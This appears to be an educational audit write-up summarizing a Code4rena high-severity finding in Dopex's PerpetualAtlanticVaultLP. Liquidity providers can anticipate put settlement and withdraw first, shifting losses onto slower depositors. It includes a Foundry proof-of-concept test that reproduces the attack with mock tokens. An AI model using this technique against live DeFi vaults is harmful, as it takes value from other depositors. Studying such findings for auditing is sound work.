# ETAAcademy-Adudit: 6. Option

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>06. Option</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>option</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] Put settlement can be anticipated and lead to user losses and bonding DoS

### Put settlement

- Summary: Liquidity providers in PerpetualAtlanticVaultLP can anticipate potential losses from in-the-money put options, allowing them to withdraw liquidity before losses occur. This creates a disadvantage for slower or less technically savvy users. The issue is rooted in the predictability of settlement price thresholds and the LPs' ability to redeem collateral at any time, potentially draining available collateral and hindering market participation for other users.

- Impact & Recommendation: The severity is high because new depositors face guaranteed losses without a clear solution. Possible fixes include implementing a "cooling off period" for withdrawals or minting more shares to reward long-term holders, but both options impact the project's token economics.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-02-put-settlement-can-be-anticipated-and-lead-to-user-losses-and-bonding-dos) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.19;
    import { Test } from "forge-std/Test.sol";
    import "forge-std/console.sol";
    import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
    import { Setup } from "./Setup.t.sol";
    import { PerpetualAtlanticVault } from "contracts/perp-vault/PerpetualAtlanticVault.sol";
    contract PoC is ERC721Holder, Setup {
    // ================================ HELPERS ================================ //
    function mintWeth(uint256 _amount, address _to) public {
        weth.mint(_to, _amount);
    }
    function mintRdpx(uint256 _amount, address _to) public {
        rdpx.mint(_to, _amount);
    }
    function deposit(uint256 _amount, address _from) public {
        vm.startPrank(_from, _from);
        vaultLp.deposit(_amount, _from);
        vm.stopPrank();
    }
    function purchase(uint256 _amount, address _as) public returns (uint256 id) {
        vm.startPrank(_as, _as);
        (, id) = vault.purchase(_amount, _as);
        vm.stopPrank();
    }
    function setApprovals(address _as) public {
        vm.startPrank(_as, _as);
        rdpx.approve(address(vault), type(uint256).max);
        rdpx.approve(address(vaultLp), type(uint256).max);
        weth.approve(address(vault), type(uint256).max);
        weth.approve(address(vaultLp), type(uint256).max);
        vm.stopPrank();
    }
    // ================================ CORE ================================ //
    /**
    Assumptions & config:
        - address(this) is impersonating the rdpxV2Core contract
        - premium per option: 0.05 weth
        - epoch duration: 1 day; 86400 seconds
        - initial price of rdpx: 0.2 weth
        - pricing precision is in 0.1 gwei
        - premium precision is in 0.1 gwei
        - rdpx and weth denomination in wei
    **/
    function testPoCHigh3() external {
        // Setup starts here ----------------------------->
        setApprovals(address(1));
        setApprovals(address(2));
        setApprovals(address(3));
        mintWeth(5 ether, address(1));
        mintWeth(5 ether, address(2));
        mintWeth(25 ether, address(3));
        /// The users deposit
        deposit(5 ether, address(1));
        deposit(5 ether, address(2));
        deposit(25 ether, address(3));
        uint256 userBalance = vaultLp.balanceOf(address(1));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(2));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(3));
        assertEq(userBalance, 25 ether);
        // premium = 100 * 0.05 weth = 5 weth
        uint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activated
        skip(86500); // expires epoch 1
        vault.updateFunding();
        vault.updateFundingPaymentPointer();
        uint256[] memory strikes = new uint256[](1);
        strikes[0] = 0.015 gwei;
        uint256 fundingAccrued = vault.calculateFunding(strikes);
        assertEq(fundingAccrued, 5 ether);
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        /// ---------------- POC STARTS HERE ---------------------------------------------------///
        // At this point the Core contract has purchased options to sell 100 rdpx tokens
        // The market moves against `rdpx` and the puts are now in the money
        priceOracle.updateRdpxPrice(0.010 gwei);
        // Bob, a savvy user, sees there is collateral available to withdraw, and
        // because he monitors the price he knows the vault is about to take a loss
        // thus, he withdraws his capital, expecting a call to settle.
        userBalance = vaultLp.balanceOf(address(1));
        vm.startPrank(address(1));
        vaultLp.redeem(userBalance, address(1), address(1));
        vm.stopPrank();
        vm.startPrank(address(this), address(this));
        (uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);
        vm.stopPrank();
        // Bob now re-enters the LP Vault
        vm.startPrank(address(1));
        vaultLp.deposit(weth.balanceOf(address(1)), address(1));
        vm.stopPrank();
        // Now we tally up the scores
        console.log("User Bob ends with (WETH, RDPX, Shares):");
        userBalance = vaultLp.balanceOf(address(1));
        (uint256 aBob, uint256 bBob) = vaultLp.redeemPreview(userBalance);
        console.log(aBob, bBob, userBalance);
        userBalance = vaultLp.balanceOf(address(2));
        (uint256 aDave, uint256 bDave) = vaultLp.redeemPreview(userBalance);
        console.log("User Dave ends with (WETH, RDPX, Shares):");
        console.log(aDave, bDave, userBalance);
        /**
            Bob and Dave both started with 5 ether deposited into the vault LP.
            Bob ends up with shares worth 4.08 WETH + 16.32 RDPX
            Dave ends up with shares worth 3.48 WETH + 13.94 RDPX
            Thus we can conclude that by anticipating calls to `settle`,
            either by monitoring the market or through front-running,
            Bob has forced Dave to take on more of the losses.
        */
    }
    }

  ```

  </details>
